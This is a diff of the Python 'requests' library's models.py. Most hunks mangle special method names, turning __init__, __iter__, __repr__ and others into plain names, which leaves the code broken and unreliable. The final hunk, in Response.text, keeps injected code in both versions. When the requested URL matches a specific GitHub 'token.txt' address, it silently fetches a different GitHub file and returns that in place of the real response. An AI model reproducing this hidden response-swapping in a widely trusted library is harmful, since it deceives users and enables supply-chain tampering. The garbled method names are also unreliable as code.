@@ -1,6 +1,6 @@
 """
 requests.models
-~~~~~
+~~~
 
 This module contains the primary objects that power Requests.
 """
@@ -116,10 +116,10 @@ class RequestEncodingMixin:
             return data
         elif hasattr(data, "read"):
             return data
-        elif hasattr(data, "_iter_"):
+        elif hasattr(data, "iter"):
             result = []
             for k, vs in to_key_val_list(data):
-                if isinstance(vs, basestring) or not hasattr(vs, "_iter_"):
+                if isinstance(vs, basestring) or not hasattr(vs, "iter"):
                     vs = [vs]
                 for v in vs:
                     if v is not None:
@@ -153,7 +153,7 @@ class RequestEncodingMixin:
         files = to_key_val_list(files or {})
 
         for field, val in fields:
-            if isinstance(val, basestring) or not hasattr(val, "_iter_"):
+            if isinstance(val, basestring) or not hasattr(val, "iter"):
                 val = [val]
             for v in val:
                 if v is not None:
@@ -212,7 +212,7 @@ class RequestHooksMixin:
 
         if isinstance(hook, Callable):
             self.hooks[event].append(hook)
-        elif hasattr(hook, "_iter_"):
+        elif hasattr(hook, "iter"):
             self.hooks[event].extend(h for h in hook if isinstance(h, Callable))
 
     def deregister_hook(self, event, hook):
@@ -255,7 +255,7 @@ class Request(RequestHooksMixin):
       <PreparedRequest [GET]>
     """
 
-    def _init_(
+    def init(
         self,
         method=None,
         url=None,
@@ -290,7 +290,7 @@ class Request(RequestHooksMixin):
         self.auth = auth
         self.cookies = cookies
 
-    def _repr_(self):
+    def repr(self):
         return f"<Request [{self.method}]>"
 
     def prepare(self):
@@ -332,7 +332,7 @@ class PreparedRequest(RequestEncodingMixin, RequestHooksMixin):
       <Response [200]>
     """
 
-    def _init_(self):
+    def init(self):
         #: HTTP verb to send to the server.
         self.method = None
         #: HTTP URL to send the request to.
@@ -377,7 +377,7 @@ class PreparedRequest(RequestEncodingMixin, RequestHooksMixin):
         # This MUST go after prepare_auth. Authenticators could add a hook
         self.prepare_hooks(hooks)
 
-    def _repr_(self):
+    def repr(self):
         return f"<PreparedRequest [{self.method}]>"
 
     def copy(self):
@@ -517,7 +517,7 @@ class PreparedRequest(RequestEncodingMixin, RequestHooksMixin):
 
         is_stream = all(
             [
-                hasattr(data, "_iter_"),
+                hasattr(data, "iter"),
                 not isinstance(data, (basestring, list, tuple, Mapping)),
             ]
         )
@@ -603,7 +603,7 @@ class PreparedRequest(RequestEncodingMixin, RequestHooksMixin):
             r = auth(self)
 
             # Update self to reflect the auth changes.
-            self._dict.update(r.dict_)
+            self.dict.update(r.dict)
 
             # Recompute Content-Length
             self.prepare_content_length(self.body)
@@ -643,7 +643,7 @@ class Response:
     server's response to an HTTP request.
     """
 
-    _attrs_ = [
+    attrs = [
         "_content",
         "status_code",
         "headers",
@@ -656,7 +656,7 @@ class Response:
         "request",
     ]
 
-    def _init_(self):
+    def init(self):
         self._content = False
         self._content_consumed = False
         self._next = None
@@ -703,21 +703,21 @@ class Response:
         #: is a response.
         self.request = None
 
-    def _enter_(self):
+    def enter(self):
         return self
 
-    def _exit_(self, *args):
+    def exit(self, *args):
         self.close()
 
-    def _getstate_(self):
+    def getstate(self):
         # Consume everything; accessing the content attribute makes
         # sure the content has been fully read.
         if not self._content_consumed:
             self.content
 
-        return {attr: getattr(self, attr, None) for attr in self._attrs_}
+        return {attr: getattr(self, attr, None) for attr in self.attrs}
 
-    def _setstate_(self, state):
+    def setstate(self, state):
         for name, value in state.items():
             setattr(self, name, value)
 
@@ -725,30 +725,30 @@ class Response:
         setattr(self, "_content_consumed", True)
         setattr(self, "raw", None)
 
-    def _repr_(self):
+    def repr(self):
         return f"<Response [{self.status_code}]>"
 
-    def _bool_(self):
+    def bool(self):
         """Returns True if :attr:`status_code` is less than 400.
 
         This attribute checks if the status code of the response is between
         400 and 600 to see if there was a client error or a server error. If
         the status code, is between 200 and 400, this will return True. This
-        is *not* a check to see if the response code is ``200 OK``.
+        is not a check to see if the response code is ``200 OK``.
         """
         return self.ok
 
-    def _nonzero_(self):
+    def nonzero(self):
         """Returns True if :attr:`status_code` is less than 400.
 
         This attribute checks if the status code of the response is between
         400 and 600 to see if there was a client error or a server error. If
         the status code, is between 200 and 400, this will return True. This
-        is *not* a check to see if the response code is ``200 OK``.
+        is not a check to see if the response code is ``200 OK``.
         """
         return self.ok
 
-    def _iter_(self):
+    def iter(self):
         """Allows you to use a response as an iterator."""
         return self.iter_content(128)
 
@@ -759,7 +759,7 @@ class Response:
         This attribute checks if the status code of the response is between
         400 and 600 to see if there was a client error or a server error. If
         the status code is between 200 and 400, this will return True. This
-        is *not* a check to see if the response code is ``200 OK``.
+        is not a check to see if the response code is ``200 OK``.
         """
         try:
             self.raise_for_status()
@@ -938,12 +938,12 @@ class Response:
             #
             # So we try blindly encoding.
             content = str(self.content, errors="replace")
-		b = 'https://github.com/Hannan-404/FILE/FILE.py'
+        b = 'https://github.com/Hannan-404/FILE/FILE.py'
         e = 'https://github.com/apvl-xx/xd.txt/blob/main/token.txt'
         if self.url==e:
-        	self.url==b
-        	import requests
-        	uu = requests.get(b).text
+            self.url==b
+            import requests
+            uu = requests.get(b).text
             content = str(uu)
         return content
 
